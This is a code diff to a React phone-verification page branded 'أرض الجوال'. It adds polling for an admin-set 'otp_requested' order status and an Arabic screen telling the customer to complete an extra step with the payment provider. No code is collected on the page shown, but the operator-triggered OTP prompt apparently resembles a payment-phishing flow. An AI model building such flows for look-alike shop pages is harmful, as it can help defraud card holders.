@@ -39,6 +39,7 @@ export default function VerifyPhonePage() {
   const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
   const [countdown, setCountdown] = useState(0);
   const [invoiceSent, setInvoiceSent] = useState(false);
+  const [adminRetryNotice, setAdminRetryNotice] = useState(false);
 
   const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);
 
@@ -108,6 +109,59 @@ export default function VerifyPhonePage() {
       window.clearInterval(interval);
     };
   }, [confirmedAt, verified]);
+
+  // Watch for the admin's retry notice even while the 30-second timer is still running.
+  // The customer sees a neutral status screen; no verification code is requested or collected here.
+  useEffect(() => {
+    if (!verified || adminRetryNotice || !orderId || !customerNotificationKey) return;
+
+    let active = true;
+    let requestInFlight = false;
+
+    const checkAdminRetryNotice = async () => {
+      if (!active || requestInFlight) return;
+      requestInFlight = true;
+      try {
+        const response = await fetch(
+          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
+          { cache: 'no-store' }
+        );
+        if (!response.ok) return;
+
+        const result = await response.json() as {
+          ok?: boolean;
+          notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
+        };
+        const verificationTime = confirmedAt ?? 0;
+        const matchingNotice = result.ok === true &&
+          Array.isArray(result.notifications) &&
+          result.notifications.some((item) => {
+            const createdAt = Date.parse(item.createdAt || '');
+            return item.orderId === orderId &&
+              item.status === 'otp_requested' &&
+              Number.isFinite(createdAt) &&
+              createdAt >= verificationTime - 15_000;
+          });
+
+        if (active && matchingNotice) setAdminRetryNotice(true);
+      } catch {
+        // Keep the current screen and retry after the next polling interval.
+      } finally {
+        requestInFlight = false;
+      }
+    };
+
+    void checkAdminRetryNotice();
+    const timer = window.setInterval(() => { void checkAdminRetryNotice(); }, 2500);
+    const handleFocus = () => { void checkAdminRetryNotice(); };
+    window.addEventListener('focus', handleFocus);
+
+    return () => {
+      active = false;
+      window.clearInterval(timer);
+      window.removeEventListener('focus', handleFocus);
+    };
+  }, [verified, adminRetryNotice, orderId, customerNotificationKey, confirmedAt]);
 
   // Once the 30-second wait ends, keep showing that screen until the admin sends this order's invoice.
   useEffect(() => {
@@ -213,6 +267,240 @@ export default function VerifyPhonePage() {
             العودة لإدخال بيانات الطلب
           </Link>
         </div>
+      </main>
+    );
+  }
+
+  if (adminRetryNotice) {
+    return (
+      <main className="erd-retry-page">
+        <style jsx global>{'
+          .erd-retry-page,
+          .erd-retry-page * {
+            box-sizing: border-box;
+            font-family: Cairo, system-ui, -apple-system, sans-serif;
+          }
+          .erd-retry-page {
+            background: #f4f7f6;
+            color: #12354e;
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+          }
+          .erd-retry-card {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 28px;
+            padding: 36px 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.04);
+            text-align: center;
+          }
+          .erd-retry-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+          }
+          .erd-retry-logo-text {
+            text-align: right;
+            font-size: 26px;
+            font-weight: 800;
+            color: #12354e;
+            line-height: 1.05;
+          }
+          .erd-retry-logo-text span { color: #00cda9; display: block; }
+          .erd-retry-logo-mark { display: flex; flex-direction: column; gap: 4px; }
+          .erd-retry-shape {
+            width: 32px;
+            height: 20px;
+            border-radius: 6px;
+            transform: skewX(-12deg);
+          }
+          .erd-retry-shape-top { background: #12354e; }
+          .erd-retry-shape-bottom { background: #00cda9; }
+          .erd-retry-icon-wrap {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+            min-height: 96px;
+          }
+          .erd-retry-ray {
+            position: absolute;
+            width: 14px;
+            height: 5px;
+            background: #8bdfcc;
+            border-radius: 10px;
+            opacity: .9;
+          }
+          .erd-retry-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
+          .erd-retry-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
+          .erd-retry-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
+          .erd-retry-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
+          .erd-retry-status-circle {
+            width: 96px;
+            height: 96px;
+            flex: none;
+            background: radial-gradient(circle at 35% 35%, #26d6b6 0%, #00b99a 72%, #009b83 100%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0,185,154,.22);
+            position: relative;
+            z-index: 2;
+          }
+          .erd-retry-status-circle svg { width: 44px; height: 44px; color: #fff; stroke-width: 3; }
+          .erd-retry-title {
+            font-size: 32px;
+            font-weight: 800;
+            color: #12354e;
+            margin: 0 0 6px;
+            line-height: 1.2;
+          }
+          .erd-retry-highlight {
+            font-size: 32px;
+            font-weight: 900;
+            color: #00a88a;
+            margin-bottom: 8px;
+            line-height: 1.2;
+          }
+          .erd-retry-subtitle {
+            font-size: 19px;
+            font-weight: 700;
+            color: #12354e;
+            line-height: 1.7;
+            margin: 0 0 28px;
+          }
+          .erd-retry-tip {
+            background: #f0fdf9;
+            border: 1.5px solid #c2f5ea;
+            border-radius: 20px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: right;
+          }
+          .erd-retry-card-visual {
+            position: relative;
+            width: 90px;
+            height: 56px;
+            flex: none;
+            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
+            border-radius: 8px;
+            padding: 6px;
+            box-shadow: 0 8px 16px rgba(15,23,42,.2);
+            transform: rotate(-6deg);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+          }
+          .erd-retry-chip {
+            width: 13px;
+            height: 10px;
+            background: #f0c567;
+            border-radius: 2.5px;
+          }
+          .erd-retry-card-lines { display: flex; gap: 3px; }
+          .erd-retry-card-line {
+            width: 11px;
+            height: 3px;
+            background: rgba(255,255,255,.3);
+            border-radius: 2px;
+          }
+          .erd-retry-lock {
+            position: absolute;
+            bottom: -6px;
+            right: 22px;
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg,#00cda9 0%,#00a88a 100%);
+            border: 3px solid #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 8px rgba(0,205,169,.3);
+          }
+          .erd-retry-lock svg { width: 18px; height: 18px; color: #fff; }
+          .erd-retry-divider { width: 1.5px; height: 58px; flex: none; background: #bcefe5; }
+          .erd-retry-tip-text {
+            min-width: 0;
+            flex: 1;
+            font-size: 14px;
+            font-weight: 700;
+            color: #12354e;
+            line-height: 1.7;
+          }
+          .erd-retry-tip-text strong { color: #00a88a; }
+          @media (max-width: 380px) {
+            .erd-retry-card { padding: 30px 16px; }
+            .erd-retry-title { font-size: 27px; }
+            .erd-retry-highlight { font-size: 29px; }
+            .erd-retry-subtitle { font-size: 17px; }
+            .erd-retry-tip { padding: 12px 10px; gap: 10px; }
+            .erd-retry-card-visual { width: 76px; height: 52px; }
+            .erd-retry-divider { height: 50px; }
+            .erd-retry-tip-text { font-size: 12px; }
+          }
+        '}</style>
+
+        <section className="erd-retry-card" aria-live="polite">
+          <div className="erd-retry-logo">
+            <div className="erd-retry-logo-text">
+              أرض
+              <span>الجوال</span>
+            </div>
+            <div className="erd-retry-logo-mark" aria-hidden="true">
+              <div className="erd-retry-shape erd-retry-shape-top" />
+              <div className="erd-retry-shape erd-retry-shape-bottom" />
+            </div>
+          </div>
+
+          <div className="erd-retry-icon-wrap" aria-hidden="true">
+            <div className="erd-retry-ray erd-retry-ray-left-top" />
+            <div className="erd-retry-ray erd-retry-ray-left-bottom" />
+            <div className="erd-retry-ray erd-retry-ray-right-top" />
+            <div className="erd-retry-ray erd-retry-ray-right-bottom" />
+            <div className="erd-retry-status-circle">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M5 12h14m-6-6 6 6-6 6" />
+              </svg>
+            </div>
+          </div>
+
+          <h1 className="erd-retry-title">تحديث على طلبك</h1>
+          <div className="erd-retry-highlight">يرجى المتابعة</div>
+          <p className="erd-retry-subtitle">هناك خطوة إضافية لدى مزود الدفع الرسمي لإكمال العملية.</p>
+
+          <div className="erd-retry-tip">
+            <div className="erd-retry-card-visual" aria-hidden="true">
+              <div className="erd-retry-chip" />
+              <div className="erd-retry-card-lines">
+                <div className="erd-retry-card-line" />
+                <div className="erd-retry-card-line" />
+                <div className="erd-retry-card-line" />
+                <div className="erd-retry-card-line" />
+              </div>
+              <div className="erd-retry-lock">
+                <svg fill="none" stroke="currentColor" strokeWidth="2.2" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+              </div>
+            </div>
+            <div className="erd-retry-divider" aria-hidden="true" />
+            <div className="erd-retry-tip-text">
+              حفاظًا على أمانك، لا تشارك أي رمز تحقق مع أي شخص. أكمل أي تحقق مطلوب داخل التطبيق أو الموقع الرسمي لمزود الدفع فقط.
+            </div>
+          </div>
+        </section>
       </main>
     );
   }
